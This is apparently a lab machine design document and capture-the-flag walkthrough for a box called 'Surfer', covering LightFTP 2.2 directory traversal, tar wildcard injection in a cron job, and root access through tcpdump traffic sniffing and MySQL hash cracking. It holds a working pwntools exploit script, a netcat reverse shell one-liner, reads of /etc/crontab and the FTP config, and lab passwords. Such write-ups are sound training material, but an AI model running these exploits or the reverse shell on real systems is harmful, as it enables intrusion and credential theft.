# [Surfer]

## Introduction

This box is based on network exploitation, leveraging some common misconfigurations of FTP and MySQL. The intended path of the user flag consists of exploit research over LightFTP 2.2, disclosing a directory traversal vulnerability, reading the configuration file of FTP disclosing a password and the cron jobs configuration., and abusing a wildcard injection in the cron job. The root flag consists in revealing the capabilities of tcpdump, which allow a standard user to sniff the traffic. After opening the traffic dump with wireshark, one can recover the mysql password by reconstructing the hash and using hashcat, which is reused to log into the root account.

## Info for HTB

### FTP Access
| User      | Password         |
| --------- | ---------------- |
| anonymous |                  |
| ftpadmin  | N3tAdM1nFTP!2026 |

### Local Access

| User     | Password       |
| -------- | -------------- |
| netadmin | netadmin1      |
| root     | poiuytrewq2468 |

### Key Processes

- FTP (external) - LightFTP 2.2
- MySQL (internal, docker)

### Automation / Crons

There are two cronjobs in `/etc/crontab`:
```
* * * * * netadmin cd /srv/ftp/ftpadmin && tar -czf /home/netadmin/share_backup.tar.gz *
* * * * * root /root/db_backup.sh
```
The first one backs up all the files in the "ftpadmin" share. It is necessary to achieve code execution, by abusing the wildcard injection. 

The second one backs up the mysql employees database in `/var/tmp`, by executing `db_backup.sh`:
```bash
#!/bin/bash

mysql -u sqladmin -ppoiuytrewq2468 -h 172.17.0.1 --protocol=TCP --ssl-mode=DISABLED -e 'use employees; select * from employees;' > /var/tmp/employees.bak
```
It is also necessary for the exploitation, since the attacker can sniff the mysql connection hashes over the network.

### Docker

The mysql service is opened via a `docker-compose.yml` file:

```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql_server
    ports:
      - "172.17.0.1:3306:3306"
    environment:
	  MYSQL_ROOT_PASSWORD: Sup3rS3cre3tP@ss123!
	  MYSQL_DATABASE: employees
    volumes:
      - mysql_data:/var/lib/mysql
    restart: unless-stopped
    
volumes:
  mysql_data:
```

### Other

- The `/etc/my.cnf` file in the MySQL docker container has the line `default-authentication-plugin=mysql_native_password` to make the hash cracking procedure easier


# Writeup

# Enumeration

Executing a basic nmap scan reveals the open LightFTP server, with anonymous login allowed:
```bash
└─$ sudo nmap -sCV -Pn --disable-arp-ping -v --top-ports 3000 --open 192.168.0.117
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 15:43 +0100

<...SNIP...>

PORT     STATE SERVICE VERSION
2121/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--  1 0 0 201 Feb 06 16:50 readme.txt
| -rw-r--r--  1 0 0 365 Feb 06 16:53 report.txt
|_-rw-r--r--  1 0 0 371 Feb 06 16:52 stats.csv
| fingerprint-strings: 
|   GenericLines: 
|     220 LightFTP server ready
|     Syntax error in parameters or arguments.
|   Help: 
|     220 LightFTP server ready
|     214-The following commands are recognized.
|     ABOR APPE AUTH CDUP CWD DELE EPSV FEAT HELP LIST MKD MLSD NOOP OPTS
|     PASS PASV PBSZ PORT PROT PWD QUIT REST RETR RMD RNFR RNTO SITE SIZE
|     STOR SYST TYPE USER
|     Help OK.
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 LightFTP server ready

```

# Foothold

After connecting with FTP and downloading the files,
```bash
└─$ ftp 192.168.0.117 2121
Connected to 192.168.0.117.
220 LightFTP server ready
Name (192.168.0.117:damuna): anonymous
331 User anonymous OK. Password required
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12228|)
150 File status okay; about to open data connection.
-rw-r--r--  1 0 0 201 Feb 06 16:50 readme.txt
-rw-r--r--  1 0 0 365 Feb 06 16:53 report.txt
-rw-r--r--  1 0 0 371 Feb 06 16:52 stats.csv
226 Transfer complete. Closing data connection.
ftp> get readme.txt
229 Entering Extended Passive Mode (|||39319|)
150 File status okay; about to open data connection.
100% |*********************************************|   201       20.40 KiB/s    00:00 ETA
226 Transfer complete. Closing data connection.
201 bytes received in 00:00 (4.26 KiB/s)
```

we find a disclosed version number in `readme.txt`:
```bash
└─$ cat readme.txt 
Welcome to the Backup Utility FTP Server 2.2 !

Anonymous authentication is supported to provide simple access to public documents or logs.
Please avoid including confidential data through this share.
```
A quick google search reveals this [blog post](https://vuln.dev/real-world-ctf-2023-nonheavyftp/), where the author developed a python script, to automate the exploit. To make it work, we need to change the variables RHOST, and the "decoy file" hello.txt. We also changed the script in such a way that it takes the files from a terminal input, to make the file search easier. 
```python
from pwn import *
import binascii
import sys

RHOST = b"192.168.0.117"

def init():
    p.recvuntil(b"220")
    p.sendline(b"USER anonymous")
    p.recvuntil(b"331")
    p.sendline(b"PASS root")
    p.recvuntil(b"230")
    p.sendline(b"PASV")
    p.recvline()
    result = p.recvline().rstrip(b"\r\b")
    parts = [int(s) for s in re.findall(r'\b\d+\b', result.decode())]
    port = parts[-2]*256+parts[-1]
    return port

def read(port):
    p = remote(RHOST, port, level='debug')
    print(p.recvall(timeout=2))
    p.close()

# Get filename from terminal input
filename = input("Enter the filename to retrieve: ").strip()
if not filename:
    print("No filename provided, exiting.")
    sys.exit(1)

# Convert to bytes if it's a string
if isinstance(filename, str):
    filename = filename.encode()

# list dir
p = remote(RHOST, 2121, level='debug')
p.newline = b'\r\n'
port = init()
p.sendline(b"RETR stats.csv")  # send LIST command, wants to send us result via data port
p.sendline(b"USER " + filename) # send USER command with user-provided filename
p.recvline()
read(port)
p.recvline()
p.recvline()
p.close()
```

By requesting the file `/proc/self/cmdline` we leak the path of the configuration file:
```bash
└─$ python3 exp.py 
Enter the filename to retrieve: /proc/self/cmdline
[+] Opening connection to b'192.168.0.117' on port 2121: Done

<...SNIP...>

[*] Closed connection to b'192.168.0.117' port 42197
b'/home/netadmin/light_ftp_srv/fftp\x00/home/netadmin/light_ftp_srv/config/fftp.conf\x00'
[DEBUG] Received 0x33 bytes:
    b'331 User /proc/self/cmdline OK. Password required\r\n'
[DEBUG] Received 0x31 bytes:
    b'226 Transfer complete. Closing data connection.\r\n'
[*] Closed connection to b'192.168.0.117' port 2121
```
And reading the configuration file `/home/netadmin/light_ftp_srv/config/fftp.conf`, leaks the FTP password of `ftpadmin`, `N3tAdM1nFTP!2026`:
```bash
└─$ python3 exp.py 
Enter the filename to retrieve: /home/netadmin/light_ftp_srv/config/fftp.conf
[+] Opening connection to b'192.168.0.117' on port 2121: Done

<...SNIP...>

"\n\n[anonymous]\npswd=*\naccs=readonly\nroot=/srv/ftp/anonymous\n\n[ftpadmin]\npswd=N3tAdM1nFTP!2026\naccs=admin\nroot=/srv/ftp/ftpadmin\n'
[DEBUG] Received 0x4e bytes:
    b'331 User /home/netadmin/light_ftp_srv/config/fftp.conf OK. Password required\r\n'
[DEBUG] Received 0x31 bytes:
    b'226 Transfer complete. Closing data connection.\r\n'
[*] Closed connection to b'192.168.0.117' port 2121
```

Logging in as `ftpadmin:N3tAdM1nFTP!2026` shows a txt file, `reminder.txt`, which hints to cronjob. Thus, let us read the crontab file, using the directory traversal vulnerability:
```bash
─$ python3 exp.py 
Enter the filename to retrieve: /etc/crontab
[+] Opening connection to b'192.168.0.117' on port 2121: Done

<...SNIP...>

    b'* * * * * netadmin cd /srv/ftp/ftpadmin && tar -czf /home/netadmin/share_backup.tar.gz * \n'
    b'* * * * * root /root/db_backup.sh \n'
[*] Closed connection to b'192.168.0.117' port 31132

<...SNIP...>
```
This file, clearly shows a wildcard injection in the `netadmin` Cron, which allows the attacker to achieve code execution on the server, since `netadmin` has upload privileges on the FTP server.
To exploit it, we have to:
1. Create a shell file:
   ```bash
   echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.0.202 4444 >/tmp/f' > shell.sh
   ``` 
2. Create special files for `tar`:
```bash
   touch ./--checkpoint=1
   touch ./--checkpoint-action=exec=sh\ shell.sh
```
3. Open a listener:
```bash
nc -lvnp 4444
```
4. Upload them on the FTP server:
```shell 
ftp> put shell.sh
local: shell.sh remote: shell.sh
229 Entering Extended Passive Mode (|||4275|)
150 File status okay; about to open data connection.
100% |*********************************************|    89      835.71 KiB/s    00:00 ETA
226 Transfer complete. Closing data connection.
89 bytes sent in 00:00 (1.93 KiB/s)
ftp> put --checkpoint=1 
remote: --checkpoint=1
229 Entering Extended Passive Mode (|||13510|)
150 File status okay; about to open data connection.
     0        0.00 KiB/s 
226 Transfer complete. Closing data connection.
ftp> put --checkpoint-action=exec=sh\ shell.sh 
remote: --checkpoint-action=exec=sh shell.sh
229 Entering Extended Passive Mode (|||2802|)
150 File status okay; about to open data connection.
     0        0.00 KiB/s 
226 Transfer complete. Closing data connection.

```
5. Wait to get a connection back
# Privilege Escalation

Enumerating capabilities reveals that `tcpdump` has some privileged capabilities:

```bash
getcap -r / 2>/dev/null
<...SNIP...>
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
<...SNIP...>
```
Which means that the user `netadmin` can sniff the traffic. Thus, one can save the traffic in a file by executing:
```bash
tcpdump -i any -w traffic.pcap
```
and transfer it on the attacker's machine with a `python3` server. 
Opening the `pcap` file with wireshark reveals a MySQL login, with an encoded password.
After some research, one finds this [article](https://0xma.github.io/hacking/toby_crack_mysql_hashes.html), explaining how to reconstruct the hash and crack the password.

1. Identify the Server Greeting on wireshark and copy both salts, in Hex stream:
![[Pasted image 20260216145724.png]]
![[Pasted image 20260216145910.png]]
2. Identify the Login Request and copy the password hash:
![[Pasted image 20260216150137.png]]
![[Pasted image 20260216150231.png]]
3. The format of the hash is given by:
```
$mysqlna$[FIRST_SALT_IN_HEX][SECOND_SALT_IN_HEX]*[PASSWORD_HASH]
```
By putting everything together and cleaning bad nullbytes from the salt streams, we can successfully crack the hash:
```bash
└─$ cat hash
$mysqlna$577d38773c2e7a0b631d573f4e35265b6a14655b*7c43ff14a2640d035fccf38b8c5995771cff29ff
└─$ hashcat -m 11200 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<...SNIP...>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$mysqlna$577d38773c2e7a0b631d573f4e35265b6a14655b*7c43ff14a2640d035fccf38b8c5995771cff29ff:poiuytrewq2468

```

After cracking the password, the command `su root` allows root access using the previously cracked password.